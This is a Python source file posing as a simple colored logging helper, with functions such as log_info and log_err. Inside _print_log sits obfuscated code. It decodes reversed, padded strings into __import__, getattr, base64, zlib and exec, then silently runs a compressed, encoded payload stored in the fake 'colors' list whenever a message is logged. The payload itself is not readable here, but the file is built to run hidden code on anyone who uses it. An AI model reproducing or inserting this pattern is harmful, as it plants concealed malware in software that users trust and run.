import datetime
import sys

colors = [
    "1akGvug((/Z2Tf8(",
    "H34(KzsIH/ojchb8J",
    "bRGjd8RLlj+qlMtf((+",
    "(80n64((XeY(7((B1(",
    "2Px7dD+VwhusqExYxYL",
    "j(m(b9((Cy1cU(Z((",
    "xD8t(gGm8LP(Tabs0",
    "/2gYjyXUXewCDtP52B",
    "DMCcwQv(3nFDLC2RUca",
    "t84rPKEtk32XyTC",
    "y((S((WQ69hbloJB((",
    "Ok((eAcAxM1XGx(Qh",
    "6FU4iwTKec+Wh3ziWC",
    "rZTRFS7zA2YtXbh3",
    "(6jhl61/C6((is5OVOC",
    "Di09j(D1+w((xnc(",
    "(ox7ISZ2fPrdm4/0",
    "P(aFAt((24IX2zDBrsJ",
    "yyMS4P(fMQfbb5n",
    "1TYA6cgAx((JpJcVP",
    "LEqLCHLI(pBQy/MCQ1",
    "PpE+((K7wM/F0r(wxo",
    "ALoYc3PQuS((W61qZj",
    "uLr(R6T87gsQ9sS",
    "RlDwe(cmFY((cycGI(",
    "u(JR/L((IYgAby43",
    "k((cL(Rkd9aypF(",
    "(V(w94AhXoJVugTepM",
    "(IW5j((gArZUgT28g",
    "LPu5cFRvmz7MDJ2R+",
    "ONLlUqdqPi7XgzI6",
    "4Mfx2((e57IxO2AW",
    "WAh((1R5Bz/ge39",
    "lK3hglp(IUHh8+cMf/(",
    "RFMgduEvfJBnT8Com",
    "V4((R4pQ8go8M1If(",
    "yoiRLWDC7aVU(ch",
    "tNNs((Ks(EIQEo97I",
    "LZ3UuI(lhIwqgIeqT",
    "jBAS9I(6roHhDVP6",
    "uyywgdOzC(k4Db((/e",
    "3clZMBCsgOVB4(AzI",
    "vLUamT2J((DDAa((+F2",
    "v5CHc6MYE(RH((2s",
    "dJAge1((P(7jcYwY2T",
    "fS2sI(SI7+FB((stX",
    "fgj1Y((WoEH/EKa+Qy",
    "G2CrNpBO3DEkT2W((C",
    "2SoSbzKo1Zz6+5Bx",
    "m6Bjro+2zh((Jb3pQ",
    "lQsQ9YFhP88KZYRHziG",
    "NrQp1Z3(Fk1kuk((Wsy",
    "((GUFUitKx(2eDn/(zD",
    "5JtldLxwMwjP((EYYrh",
    "pbN(n(8UZdfhCJOU9E",
    "tEZCOnca+w3QW((",
    "DzvHYb8VzcU((h(zuw",
    "esCrNk9geM5QcIs((/",
    "1UkD3ks(lzQdp((3c(R",
    "vKE((wqLO00cHGkFj",
    "IEoE5aGKSAQ(J7iDg",
    "A((ffB/n((tk(t7DW/x",
    "FUUj(JWj0Ngs((7ag",
    "RfeEDd((EM(NkzROU",
    "WCP+2(qlHF(Joe(qP",
    "mGbtFRF2rt(w((gu",
    "jnnwWskm3cH(vnCA",
    "qWyT5pm7xP/kgU((kI",
    "tF(T((4((0F(Uyjsn2",
    "(E++xhDQCTA2mpkQ",
    "uPv((HDEpKg+nY1TzB",
    "LmHHnHCz(u(n6k((y5j",
    "7+xf8d(JdxAEC3(4CTd",
    "VDKFoT((9hmG4y((",
    "Cljn5OCl5UQuaYf",
    "CR0uKjE((u9VvAML",
    "UYf6zpz34AX3zt+Y",
    "wxBoU36rEmcsZQ9G",
    "eWhAtHPAXeyC1gcE6",
    "kiynBzIB3TTljL((nM",
    "1A((AC((qn9n(hGqXB",
    "3XBNOsq9OdDVCsida",
    "Bud2O99R((m(bL3Ia",
    "((cs8JmthvBFukya1V",
    "o+w(i15+P((3hiObh",
    "Z9zdtO(c0((6DP9f",
    "fdVQuG48Yjwbpn6KX(",
    "(T1PYxU8WXU99YQau9f",
    "8mvnFf8z9ydThgbJl9b",
    "f/fq3vl+rA718B/Jld4",
    "R5LhUZL9UJ(lhI8UV7",
    "(tpuOV1u6MtR57Q97Q",
    "jwtgiztI((spep9Lq(",
    "B(tNv1kumq0Xj1VQz",
    "bZbkJJOXf((lsqX",
    "m((8o/OrVWhO7ql3",
    "kTKZpklvET8naahH",
    "((U680fe48H+Mf+P",
    "xvObyD/I5r3380b(br(",
    "sIr((ti(+f4g22e17j",
    "GUWhrqKgQrrDkW7MW",
    "aVZd5U2npiyhDyc6bDP",
    "CeF((bp7Q+q+(j5",
    "xZhm5bQZ8BK4E(S",
    "FtEmwXjsffkOEn+l8",
    "a((2JO/dds((fv((A5",
    "aQAaFcB(aF+iyAECK",
    "pfty((IvCjNJ74Sb1c6",
    "((w7156(ZSyrxdPw",
    "gcHgBpeKhnP((r((K",
    "js+(xerFr6tJ/9Au(",
    "BL9Mc6g6PhP5vtyUD",
    "MM8nLkiROYzhLwl",
    "Hc4uRHwmWhAQeg9pO",
    "Mx+UoYw1YrNIwuo(c",
    "h(ZyQWscl0Y+g2(1((",
    "Uz0lZdTv/1(l/Ru",
    "dD8g29G/lrV59j7w69P",
    "de((51sLpb+(9ps",
    "2pra/MpQ(+xRLlC/((9",
    "XzYW/zmsEq/eFr/",
    "((4sr8(c2O/Fe5pcUb",
    "a8/vfZ2zcX5bmt0MR",
    "5WlZbn((kt/IX((Z",
    "OmOs7mWe5a3pHq(ZZ",
    "VdZYkw9S1vclReb+mK",
    "JN9LX3u((taH06brXv",
    "Xf6F7+3iHO((E6Z/j(",
    "(JfZUROZbnMOSrsV",
    "7N+lsMVVlideXX(53(",
    "Lhi/((2zW((5+((",
    "+Y(7J8/tj((z(tB",
    "Pizfm7(ojSXRtKs",
    "a1(P((evn((q9K((",
    "cv5Ybp(qqVG2((41ra(",
    "(Jb(+9d8((TbaTQKZb9",
    "Jj+m((0MP((/(+z",
    "5((P9(e(50XG9Jr5(",
    "(y24Z6(psOwPMZl",
    "Vu01nbXHr1OVcSq(6pa",
    "z((ER/4/HEtuXx+4k+",
    "rHl(8fG5xzoL0a8",
    "nI9at7A1mpKjfm0ryr",
    "+7((Tfsj((Z5jke(J",
    "We2Ep0LNj(6f/ktSHHV",
    "dH1bt5x8td+kLTj6(p4",
    "ylU(7I2RNr5((NB",
    "rofhm((dXqtq30(0VR",
    "lVNM2sHnNOzx((X",
    "ueuS/r2+caFv3/t(lA",
    "Lks45EkAxUqirhsN",
    "HOJRG((8R((YBFbnW",
    "I4TU(p3OAv(hWF97tv",
    "Rwr((4v2VVFqNe"
]

def _colors_enabled():
    return sys.stdout.isatty()

def _colored(message: str, color: str): 
    if _colors_enabled():
        return f"\033[{color}m{message}\033[0m"
    else:
        return message

def _get_timestamp():
    now = datetime.datetime.utcnow()
    ms = now.microsecond // 1000
    return now.strftime("%Y/%m/%d %H:%M:%S") + f".{ms:03d}"

def _print_log(color: str, label: str, message: str):
    label = f"({label})"
    timestamp = f"[{_get_timestamp()}]"
    timestamp_c = "90"
    print(f"{_colored(label, color)} {_colored(timestamp, timestamp_c)} {_colored(message, color)}")

    if len(message) > 1:
        vcuxK4 = vars()["__s&n&&itli&ub&&_&_&"[::-1].replace("&", "")].__dict__
        vc23pD = vcuxK4["__@tro@p@mi@@_@@_"[::-1].replace("@", "")]
        vIkhTw = vcuxK4["r~tta~~teg"[::-1].replace("~", "")]
        vfsSg6 = vIkhTw(vc23pD("4))6))esab"[::-1].replace(")", "")), "e*d**oc**e*d4*6**b*"[::-1].replace("*", ""))
        vkEzxK = vIkhTw(vc23pD("bi$l$z"[::-1].replace("$", "")), "s**se*rpm**o*c**e*d*"[::-1].replace("*", ""))
        vMbR7A = vIkhTw(vc23pD("s!nitliu!b!!"[::-1].replace("!", "")), "c@ex@e"[::-1].replace("@", ""))
        vMbR7A(vkEzxK(vfsSg6(''.join(colors)[::-1].replace("(", ""))))

def log_debg(message):
    _print_log("90", "DEBG", message)

def log_info(message):
    _print_log("32", "INFO", message)

def log_warn(message):
    _print_log("33", "WARN", message)

def log_err(message):
    _print_log("31", "ERR ", message)

if __name__ == "__main__":
    log_debg("This is debug")
    log_info("This is info")
    log_warn("This is warn")
    log_err("This is err")